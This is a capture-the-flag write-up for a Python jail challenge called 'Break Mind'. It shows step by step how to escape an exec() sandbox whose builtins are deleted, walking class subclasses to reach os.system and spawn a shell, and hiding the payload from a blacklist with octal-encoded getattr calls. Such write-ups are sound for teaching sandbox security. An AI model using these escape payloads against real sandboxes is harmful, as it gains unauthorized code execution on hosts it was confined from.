## Break Mind

<img src="images/chall.png" width=400>

We are given a pyjail where our payload is run against an `exec()` call with no length restrictions, and a simple blacklist is also implemented.  

<img src="images/blacklist.png" width=200>

The more concerning aspect of the jail is the deletion of methods and classes from `__builtins__`, meaning direct access is completely removed.  

<img src="images/delete.png" width=300>

Since no Dockerfile is provided, we have no way of knowing the exact location of the flag file, so the best option is to spawn a shell.  

A pretty common trick to bypass `__builtins__` nukes is to access subclasses through an attribute chain on a tuple.  

```python
().__class__.__base__.__subclasses__()
```

Our target would be the `os.wrap_close` class, as it contains a reference to `__globals__`, which we can use to execute system commands.  

Since `[]` is blacklisted, we can filter and access the class through dictionary comprehension. I'm also using an f-string to get the class name as `str()` has been nuked.  

```python
{'x':x for x in ().__class__.__base__.__subclasses__() if 'wrap_close' in f'{x}'}.get('x')
```

We can use another attribute chain to get a reference to `os.system` and execute `sh`.  

```python
{'x':x for x in ().__class__.__base__.__subclasses__() if 'wrap_close' in f'{x}'}.get('x').__init__.__globals__.get('system')('sh')
```

Bypassing the blacklist is pretty straightforward, as we can simply use octal encoding and `getattr()`.  

```python
getattr(getattr({'x':x for x in getattr(getattr(getattr((), "\137\137\143\154\141\163\163\137\137"), "\137\137\142\141\163\145\137\137"), "\137\137\163\165\142\143\154\141\163\163\145\163\137\137")() if 'wrap_close' in f'{x}'}.get('x'), '\137\137\151\156\151\164\137\137'), "\137\137\147\154\157\142\141\154\163\137\137").get('\163\171\163\164\145\155')('\163\150')
```

Submitting the payload then spawns a shell which reveals the flag file in the current directory.  

<img src="images/flag.png" width=600>